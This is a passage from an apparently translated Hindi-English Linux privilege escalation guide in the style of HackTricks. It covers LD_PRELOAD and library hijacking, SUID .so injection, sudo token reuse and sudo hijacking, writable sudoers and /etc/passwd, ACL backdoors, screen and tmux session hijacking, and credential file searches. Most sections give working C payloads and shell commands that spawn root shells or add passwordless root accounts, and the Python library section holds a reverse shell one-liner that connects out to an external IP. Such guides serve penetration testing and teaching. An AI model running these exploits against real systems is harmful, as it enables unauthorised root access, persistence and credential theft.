यह attack path खास तौर पर `/usr/local/bin` में shipped "maintenance"/"backup" wrappers में common है।

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable का उपयोग एक या अधिक shared libraries (.so files) को specify करने के लिए किया जाता है, जिन्हें loader द्वारा बाकी सभी से पहले load किया जाता है, जिसमें standard C library (`libc.so`) भी शामिल है। इस process को library preloading कहा जाता है।

हालांकि, system security बनाए रखने और इस feature के exploitation को रोकने के लिए, खासकर **suid/sgid** executables के साथ, system कुछ conditions enforce करता है:

- Loader **LD_PRELOAD** को उन executables के लिए ignore करता है जहाँ real user ID (_ruid_) effective user ID (_euid_) से match नहीं करता।
- suid/sgid वाले executables के लिए, केवल standard paths में मौजूद libraries जो suid/sgid भी हैं, preload की जाती हैं।

यदि आपके पास `sudo` के साथ commands execute करने की क्षमता है और `sudo -l` का output **env_keep+=LD_PRELOAD** statement शामिल करता है, तो privilege escalation हो सकती है। यह configuration **LD_PRELOAD** environment variable को persist रहने और `sudo` के साथ commands run होने पर भी recognized होने देती है, जिससे elevated privileges के साथ arbitrary code execution संभव हो सकता है।
```
Defaults        env_keep += LD_PRELOAD
```
/tmp/pe.c
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर इसे **compile** करें using:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **privileges escalate** चलाएँ
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> एक similar privesc का abuse किया जा सकता है अगर attacker **LD_LIBRARY_PATH** env variable को control करता है क्योंकि वह उस path को control करता है जहाँ libraries search की जाने वाली हैं।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

जब किसी ऐसे binary का सामना हो जिसमें **SUID** permissions हों और वह असामान्य लगे, तो यह जांचना अच्छा अभ्यास है कि क्या वह **.so** files को ठीक से load कर रहा है। इसे निम्नलिखित command चलाकर जांचा जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
For instance, encountering an error like _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ suggests a potential for exploitation.

इसे exploit करने के लिए, कोई एक C file बनाएगा, जैसे _"/path/to/.config/libcalc.c"_, जिसमें निम्न code होगा:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह कोड, एक बार compile और execute होने के बाद, file permissions को manipulate करके और elevated privileges के साथ एक shell execute करके privileges बढ़ाने का लक्ष्य रखता है।

ऊपर दिए गए C file को एक shared object (.so) file में इस तरह compile करें:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
अंत में, प्रभावित SUID binary को run करने पर exploit trigger होना चाहिए, जिससे potential system compromise संभव हो सकता है।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमें एक SUID binary मिली है जो एक ऐसी folder से library लोड कर रही है जहाँ हम write कर सकते हैं, तो चलिए उस folder में आवश्यक name वाली library बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको ऐसा कोई error मिलता है जैसे
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) एक curated सूची है Unix binaries की, जिन्हें attacker local security restrictions को bypass करने के लिए exploit कर सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) वही है, लेकिन उन cases के लिए जहाँ आप किसी command में **sirf arguments inject** कर सकते हैं।

यह project Unix binaries के legitimate functions को collect करता है, जिन्हें abused करके restricted shells से निकलने, elevated privileges escalate या maintain करने, files transfer करने, bind और reverse shells spawn करने, और अन्य post-exploitation tasks को आसान बनाने के लिए use किया जा सकता है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

अगर आप `sudo -l` access कर सकते हैं, तो आप tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) का use करके check कर सकते हैं कि क्या यह किसी sudo rule को exploit करने का तरीका ढूँढता है।

### Reusing Sudo Tokens

उन cases में जहाँ आपके पास **sudo access** है लेकिन password नहीं है, आप **sudo command execution के लिए wait करके और फिर session token hijack करके** privileges escalate कर सकते हैं।

Privileges escalate करने के लिए requirements:

- आपके पास user "_sampleuser_" के रूप में already shell हो
- "_sampleuser_" ने पिछले **15 mins** में कुछ execute करने के लिए **`sudo`** का use किया हो (default रूप से यह sudo token की duration है, जो हमें password दिए बिना `sudo` use करने देती है)
- `cat /proc/sys/kernel/yama/ptrace_scope` 0 हो
- `gdb` accessible हो (आप इसे upload कर सकें)

(आप temporarily `ptrace_scope` को `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` से enable कर सकते हैं या permanently `/etc/sysctl.d/10-ptrace.conf` को modify करके `kernel.yama.ptrace_scope = 0` set कर सकते हैं)

अगर ये सभी requirements met हैं, तो आप privileges को इस method से escalate कर सकते हैं: [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **पहला exploit** (`exploit.sh`) binary `activate_sudo_token` को _/tmp_ में create करेगा। आप इसका use करके **अपनी session में sudo token activate** कर सकते हैं (आपको automatically root shell नहीं मिलेगा, `sudo su` करें):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **दूसरा exploit** (`exploit_v2.sh`) _/tmp_ में **root के owned with setuid** वाला एक sh shell बनाएगा
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **तीसरा exploit** (`exploit_v3.sh`) **एक sudoers file बनाएगा** जो **sudo tokens को eternal बना देता है और सभी users को sudo use करने की अनुमति देता है**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि आपके पास फ़ोल्डर में या फ़ोल्डर के अंदर बनाए गए किसी भी फ़ाइल पर **write permissions** हैं, तो आप binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके किसी user और PID के लिए एक **sudo token** बना सकते हैं।\
उदाहरण के लिए, अगर आप फ़ाइल _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और आपके पास उस user के रूप में PID 1234 वाली shell है, तो आप पासवर्ड जाने बिना **sudo privileges** प्राप्त कर सकते हैं, ऐसा करके:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

फ़ाइल `/etc/sudoers` और `/etc/sudoers.d` के अंदर की फ़ाइलें यह configure करती हैं कि कौन `sudo` का उपयोग कर सकता है और कैसे। ये फ़ाइलें **by default केवल user root और group root द्वारा read की जा सकती हैं**.\
**If** आप इस फ़ाइल को **read** कर सकते हैं, तो आप **कुछ interesting information प्राप्त** कर सकते हैं, और अगर आप किसी भी फ़ाइल में **write** कर सकते हैं, तो आप **privileges को escalate** कर पाएंगे.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
अगर आप लिख सकते हैं तो आप इस permission का abuse कर सकते हैं
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन अनुमतियों का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` बाइनरी के कुछ विकल्प हैं, जैसे OpenBSD के लिए `doas`; इसकी configuration को `/etc/doas.conf` पर जांचना याद रखें
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

यदि आप जानते हैं कि **एक user आमतौर पर किसी machine से connect करता है और privileges escalate करने के लिए `sudo` का उपयोग करता है** और आपको उसी user context में एक shell मिल गया है, तो आप **एक नया sudo executable बना सकते हैं** जो आपका code root के रूप में execute करेगा और फिर user's command चलाएगा। फिर, user context के **$PATH** को modify करें (उदाहरण के लिए `.bash_profile` में नया path जोड़कर) ताकि जब user `sudo` execute करे, तो आपका sudo executable execute हो।

ध्यान दें कि अगर user कोई अलग shell (bash नहीं) उपयोग करता है, तो नया path जोड़ने के लिए आपको दूसरी files modify करनी होंगी। उदाहरण के लिए [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को modify करता है। आप [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में एक और example देख सकते हैं।

या कुछ ऐसा चलाएँ:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

फाइल `/etc/ld.so.conf` यह बताती है कि **loaded configurations files कहाँ से आती हैं**। आमतौर पर, इस फाइल में निम्न path होता है: `include /etc/ld.so.conf.d/*.conf`

इसका मतलब है कि `/etc/ld.so.conf.d/*.conf` की configuration files पढ़ी जाएँगी। ये configuration files **अन्य folders की ओर point करती हैं** जहाँ **libraries** को **search** किया जाएगा। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की content `/usr/local/lib` है। **इसका मतलब है कि system `/usr/local/lib` के अंदर libraries search करेगा**।

अगर किसी कारण से **किसी user के पास** इनमें से किसी भी indicated path पर write permissions हों: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर कोई भी file, या `/etc/ld.so.conf.d/*.conf` के अंदर config file द्वारा indicated कोई भी folder, तो वह privileges escalate कर सकता है।\
देखें कि **इस misconfiguration को exploit कैसे करें** निम्न page में:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
`lib` को `/var/tmp/flag15/` में कॉपी करके, इसे इस स्थान पर प्रोग्राम द्वारा `RPATH` variable में specified अनुसार उपयोग किया जाएगा।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
फिर `/var/tmp` में `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` के साथ एक evil library बनाएं
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities एक **process को available root privileges का subset** provide करते हैं। इससे root **privileges छोटे और अलग-अलग units** में effectively split हो जाते हैं। इनमें से हर unit को फिर independently processes को grant किया जा सकता है। इस तरह privileges का full set कम हो जाता है, जिससे exploitation का risk घटता है।\
**capabilities के बारे में और उन्हें abuse कैसे करें, यह जानने के लिए** निम्न पेज पढ़ें:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

किसी directory में, **"execute" bit** का मतलब है कि affected user उस folder के अंदर "**cd**" कर सकता है।\
**"read"** bit का मतलब है कि user **files** को **list** कर सकता है, और **"write"** bit का मतलब है कि user **new files** को **delete** और **create** कर सकता है।

## ACLs

Access Control Lists (ACLs) permissions की secondary layer represent करती हैं, जो **traditional ugo/rwx permissions को override** करने में सक्षम होती हैं। ये permissions specific users, जो owners नहीं हैं या group का हिस्सा नहीं हैं, उनके लिए rights allow या deny करके file या directory access पर control बढ़ाती हैं। **granularity** का यह level अधिक precise access management सुनिश्चित करता है। अधिक details [**यहाँ**](https://linuxconfig.org/how-to-manage-acls-on-linux) मिल सकती हैं।

file पर user "kali" को read और write permissions **दें**:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**सिस्टम से विशिष्ट ACLs वाले** files प्राप्त करें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoers drop-ins पर छिपा ACL backdoor

एक आम misconfiguration `/etc/sudoers.d/` में root-owned file होती है, जिसका mode `440` होता है, लेकिन ACL के जरिए फिर भी low-priv user को write access मिल जाता है।
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
यदि आप `user:alice:rw-` जैसा कुछ देखते हैं, तो उपयोगकर्ता restrictive mode bits के बावजूद एक sudo rule जोड़ सकता है:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
यह एक high-impact ACL persistence/privesc path है क्योंकि यह केवल `ls -l`-only reviews में आसानी से छूट जाता है।

## Open shell sessions

**old versions** में आप किसी अलग user (**root**) की कुछ **shell** session को **hijack** कर सकते हैं।\
**newest versions** में आप केवल **अपने user** की screen sessions से ही **connect** कर पाएंगे। हालांकि, आप session के अंदर **interesting information** पा सकते हैं।

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**एक सत्र से जुड़ें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

यह **old tmux versions** के साथ एक समस्या थी। मैं non-privileged user के रूप में root द्वारा बनाई गई tmux (v2.1) session को hijack नहीं कर सका।

**List tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**एक session से attach करें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Debian based systems (Ubuntu, Kubuntu, etc) पर September 2006 और May 13th, 2008 के बीच generated सभी SSL और SSH keys इस bug से affected हो सकते हैं।\
यह bug तब होता है जब इन OS में नया ssh key बनाया जाता है, क्योंकि **सिर्फ 32,768 variations possible थीं**। इसका मतलब है कि सभी possibilities calculate की जा सकती हैं और **ssh public key होने पर आप corresponding private key search कर सकते हैं**। आप calculated possibilities यहां पा सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Specifies whether password authentication is allowed. The default is `no`.
- **PubkeyAuthentication:** Specifies whether public key authentication is allowed. The default is `yes`.
- **PermitEmptyPasswords**: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is `no`.

### Login control files

These files तय करते हैं कि कौन log in कर सकता है और कैसे:

- **`/etc/nologin`**: अगर present हो, तो non-root logins block करता है और अपना message print करता है।
- **`/etc/securetty`**: restricts करता है कि root कहां log in कर सकता है (TTY allowlist)।
- **`/etc/motd`**: post-login banner (environment या maintenance details leak कर सकता है)।

### PermitRootLogin

Specifies whether root can log in using ssh, default is `no`. Possible values:

- `yes`: root can login using password and private key
- `without-password` or `prohibit-password`: root can only login with a private key
- `forced-commands-only`: Root can login only using private key and if the commands options are specified
- `no` : no

### AuthorizedKeysFile

Specifies files that contain the public keys that can be used for user authentication. It can contain tokens like `%h`, which will be replaced by the home directory. **You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
वह configuration संकेत देगा कि यदि आप "**testusername**" उपयोगकर्ता की **private** key से login करने की कोशिश करते हैं, तो ssh आपकी key की public key की तुलना `/home/testusername/.ssh/authorized_keys` और `/home/testusername/access` में मौजूद keys से करेगा

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding आपको **अपनी local SSH keys का उपयोग करने** देता है, बजाय keys को अपने server पर (passphrases के बिना!) छोड़ने के। इसलिए, आप ssh के जरिए **एक host पर jump** कर सकेंगे और वहाँ से **दूसरे** host पर **jump** कर सकेंगे, अपने **initial host** में स्थित **key** का **use** करके।

आपको यह option `$HOME/.ssh.config` में इस तरह set करना होगा:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि यदि `Host` `*` है, तो हर बार जब उपयोगकर्ता किसी अलग मशीन पर जाता है, वह host keys तक access कर सकेगा (जो एक security issue है)।

फ़ाइल `/etc/ssh_config` इस **options** को **override** कर सकती है और इस configuration को allow या denied कर सकती है।\
फ़ाइल `/etc/sshd_config` keyword `AllowAgentForwarding` (default is allow) के साथ ssh-agent forwarding को **allow** या **denied** कर सकती है।

यदि आपको किसी environment में Forward Agent configured मिले, तो निम्न page पढ़ें क्योंकि **आप इसका abuse करके privileges escalate कर सकते हैं**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

फ़ाइल `/etc/profile` और `/etc/profile.d/` के अंतर्गत फ़ाइलें **scripts हैं जो तब execute होती हैं जब user एक नया shell चलाता है**। इसलिए, यदि आप इनमें से किसी को भी **write या modify** कर सकते हैं, तो आप privileges escalate कर सकते हैं।
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब profile script मिले तो आपको उसमें **sensitive details** की जाँच करनी चाहिए।

### Passwd/Shadow Files

OS के अनुसार `/etc/passwd` और `/etc/shadow` फ़ाइलों का नाम अलग हो सकता है या उनका backup हो सकता है। इसलिए सलाह दी जाती है कि **इन सभी को ढूँढें** और **जाँचें कि क्या आप इन्हें read कर सकते हैं** ताकि देखा जा सके कि फ़ाइलों के अंदर **hashes** हैं या नहीं:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कुछ अवसरों पर आप `/etc/passwd` (या समकक्ष) फ़ाइल के अंदर **password hashes** पा सकते हैं
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### लिखने योग्य /etc/passwd

पहले, निम्नलिखित में से किसी एक कमांड से एक password जनरेट करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
फिर user `hacker` जोड़ें और generated password जोड़ें।
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `su` command को `hacker:hacker` के साथ इस्तेमाल कर सकते हैं

वैकल्पिक रूप से, आप बिना password वाला dummy user जोड़ने के लिए निम्न lines का उपयोग कर सकते हैं.\
WARNING: इससे machine की current security कमज़ोर हो सकती है.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTE: BSD platforms पर `/etc/passwd` located at `/etc/pwd.db` और `/etc/master.passwd` है, साथ ही `/etc/shadow` को `/etc/spwd.db` renamed किया गया है।

आपको check करना चाहिए कि क्या आप कुछ **sensitive files** में **write** कर सकते हैं। For example, क्या आप किसी **service configuration file** में write कर सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, यदि मशीन एक **tomcat** सर्वर चला रही है और आप **/etc/systemd/ के अंदर Tomcat service configuration file को modify** कर सकते हैं, तो आप इन lines को modify कर सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
आपका backdoor अगली बार जब tomcat शुरू होगा तब execute किया जाएगा।

### Check Folders

निम्न folders में backups या interesting information हो सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (संभवतः आप आख़िरी वाले को read नहीं कर पाएँगे, लेकिन try करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब Location/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### अंतिम कुछ मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फ़ाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी हुई files
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH में Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **वेब फाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप्स**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Known files containing passwords

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) का code पढ़ें, यह **कई संभावित files** खोजता है जिनमें passwords हो सकते हैं।\
**एक और दिलचस्प tool** जो आप इसके लिए इस्तेमाल कर सकते हैं: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), जो एक open source application है और Windows, Linux & Mac पर local computer में stored कई passwords को retrieve करने के लिए उपयोग की जाती है।

### Logs

यदि आप logs पढ़ सकते हैं, तो उनमें **दिलचस्प/गोपनीय जानकारी** मिल सकती है। log जितना अजीब होगा, वह उतना ही दिलचस्प होगा (शायद)।\
साथ ही, कुछ "**bad**" configured (backdoored?) **audit logs** आपको audit logs में passwords **record** करने की अनुमति दे सकते हैं, जैसा कि इस post में बताया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
लॉग्स पढ़ने के लिए समूह [**adm**](interesting-groups-linux-pe/index.html#adm-group) बहुत उपयोगी होगा।

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

आपको उन फ़ाइलों की भी जाँच करनी चाहिए जिनके **नाम** में या **content** के अंदर "**password**" शब्द हो, और logs के अंदर IPs और emails, या hashes regexps भी जाँचें।\
मैं यहाँ यह नहीं बताने वाला कि यह सब कैसे किया जाए, लेकिन अगर आप interested हैं तो आप last checks देख सकते हैं जो [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) perform करता है।

## Writable files

### Python library hijacking

अगर आपको पता है कि **कहाँ से** एक python script execute होने वाली है और आप उस folder के अंदर **write कर सकते हैं** या आप **python libraries modify** कर सकते हैं, तो आप OS library को modify करके उसे backdoor कर सकते हैं (अगर आप जहाँ python script execute होने वाली है वहाँ write कर सकते हैं, तो os.py library को copy and paste करें)।

**library को backdoor** करने के लिए बस os.py library के end में following line add करें (IP और PORT change करें):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` में एक vulnerability यूज़र्स को, जो किसी log file या उसकी parent directories पर **write permissions** रखते हैं, escalation privileges पाने की संभावना देती है। ऐसा इसलिए होता है क्योंकि `logrotate`, जो अक्सर **root** के रूप में चलता है, को arbitrary files execute करने के लिए manipulate किया जा सकता है, खासकर _**/etc/bash_completion.d/**_ जैसी directories में। यह ज़रूरी है कि permissions सिर्फ _/var/log_ में ही नहीं, बल्कि हर उस directory में भी चेक करें जहाँ log rotation लागू होती है।

> [!TIP]
> यह vulnerability `logrotate` version `3.18.0` और उससे पुराने versions को प्रभावित करती है

इस vulnerability के बारे में अधिक जानकारी इस page पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

आप इस vulnerability का exploit [**logrotten**](https://github.com/whotwagner/logrotten) से कर सकते हैं।

यह vulnerability [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** से बहुत मिलती-जुलती है, इसलिए जब भी आपको लगे कि आप logs को alter कर सकते हैं, तो यह देखें कि उन logs को कौन manage कर रहा है और यह भी चेक करें कि क्या आप symlinks से logs को substitute करके privilege escalation कर सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

अगर किसी भी कारण से कोई user _/etc/sysconfig/network-scripts_ में एक `ifcf-<whatever>` script **write** कर सकता है **या** किसी existing script को **adjust** कर सकता है, तो आपका **system is pwned**.

